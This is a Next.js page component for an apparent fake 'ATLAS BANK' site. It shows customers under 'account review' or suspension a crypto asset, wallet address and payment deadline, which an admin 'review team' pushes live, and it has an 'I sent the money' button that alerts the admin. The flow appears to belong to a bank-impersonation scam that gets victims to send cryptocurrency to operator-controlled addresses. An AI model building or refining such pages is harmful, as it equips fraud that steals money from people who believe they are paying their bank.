"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { DEMO_CUSTOMER_EMAIL } from "@/lib/adminData";
import { fetchCustomerSuspensionByEmail, getNewUserSession, notifyAdminMoneySent } from "@/lib/newUserData";
import { supabase } from "@/lib/supabase";

export default function CryptoPaymentPage() {
  const router = useRouter();
  const [cryptoName, setCryptoName] = useState("");
  const [address, setAddress] = useState("");
  const [paymentTime, setPaymentTime] = useState("");
  const [justReceivedDetails, setJustReceivedDetails] = useState(false);
  const [isLoading, setIsLoading] = useState(true);
  const [isNotifyingMoneySent, setIsNotifyingMoneySent] = useState(false);
  const [message, setMessage] = useState("");

  useEffect(() => {
    const session = getNewUserSession();
    const storedEmail = typeof window !== "undefined" ? window.localStorage.getItem("customerEmail") : null;
    const email = storedEmail || session?.customerEmail || DEMO_CUSTOMER_EMAIL;

    const loadDetails = async () => {
      const customer = await fetchCustomerSuspensionByEmail(email);
      const nextCryptoName = customer?.cryptoName ?? "";
      const nextAddress = customer?.cryptoAddress ?? "";
      const nextPaymentTime = customer?.cryptoPaymentTime ?? "";
      setCryptoName(nextCryptoName);
      setAddress(nextAddress);
      setPaymentTime(nextPaymentTime);
      setJustReceivedDetails(Boolean(nextCryptoName || nextAddress || nextPaymentTime));
      setIsLoading(false);
    };

    void loadDetails();

    const channel = supabase?.channel(`customer-crypto-details-${email}`)
      .on("postgres_changes", { event: "UPDATE", schema: "public", table: "customers", filter: `email=eq.${email}` }, (payload) => {
        const updated = payload.new as Record<string, unknown>;
        const nextCryptoName = typeof updated.crypto_name === "string" ? updated.crypto_name : "";
        const nextAddress = typeof updated.crypto_address === "string" ? updated.crypto_address : "";
        const nextPaymentTime = typeof updated.crypto_payment_time === "string" ? updated.crypto_payment_time : "";
        setCryptoName(nextCryptoName);
        setAddress(nextAddress);
        setPaymentTime(nextPaymentTime);
        setJustReceivedDetails(Boolean(nextCryptoName || nextAddress || nextPaymentTime));
        setIsLoading(false);
      })
      .subscribe();

    const refreshInterval = window.setInterval(() => {
      void loadDetails();
    }, 3000);

    return () => {
      if (channel) void supabase?.removeChannel(channel);
      window.clearInterval(refreshInterval);
    };
  }, []);

  const handleNotifyMoneySent = async () => {
    const session = getNewUserSession();
    const storedEmail = typeof window !== "undefined" ? window.localStorage.getItem("customerEmail") : null;
    const email = storedEmail || session?.customerEmail || DEMO_CUSTOMER_EMAIL;

    if (!email) {
      setMessage("We could not identify your account. Please sign in again.");
      return;
    }

    setIsNotifyingMoneySent(true);
    setMessage("");
    try {
      await notifyAdminMoneySent(email);
      setMessage("The admin has been notified that your crypto payment was sent.");
    } catch {
      setMessage("We could not notify the admin. Please try again.");
    } finally {
      setIsNotifyingMoneySent(false);
    }
  };

  return (
    <main className="auth-layout suspension-page">
      <section className="auth-card suspension-card crypto-card" aria-labelledby="crypto-title">
        <div className="auth-card-header">
          <strong className="auth-logo">ATLAS BANK</strong>
          <p className="eyebrow">Digital payment</p>
          <div className="suspension-review-mark" aria-hidden="true">₿</div>
          <h1 id="crypto-title">Crypto payment</h1>
          <p>Use the payment details provided by the review team. Confirm the address carefully before sending.</p>
        </div>

        {justReceivedDetails ? <p className="settings-note" role="status">New crypto payment details were sent by the review team.</p> : null}
        {message ? <p className="settings-note" role="status">{message}</p> : null}

        {isLoading ? <p className="settings-note">Loading payment details...</p> : address ? (
          <>
            <div className="crypto-details" aria-label="Crypto payment details">
              <div><span>Crypto asset</span><strong>{cryptoName || "Crypto"}</strong></div>
              <div><span>Crypto address</span><strong>{address}</strong></div>
              <div><span>Payment time</span><strong>{paymentTime || "As instructed by the review team"}</strong></div>
            </div>
            <div className="suspension-money-action">
              <div>
                <span className="suspension-action-kicker">Next step</span>
                <strong>Have you sent the funds?</strong>
                <small>Let the review team know so they can check your payment.</small>
              </div>
              <button className="primary-btn" type="button" onClick={handleNotifyMoneySent} disabled={isNotifyingMoneySent}>
                {isNotifyingMoneySent ? "Notifying admin..." : "I sent the money"}
              </button>
            </div>
          </>
        ) : <p className="settings-note">Crypto payment details are not available yet. Please contact Customer Care.</p>}

        <div className="form-actions suspension-actions">
          <button className="primary-btn" type="button" onClick={() => router.push("/suspension/continue")}>Back to account review</button>
          <button className="secondary-btn" type="button" onClick={() => router.back()}>Back</button>
        </div>
      </section>
    </main>
  );
}
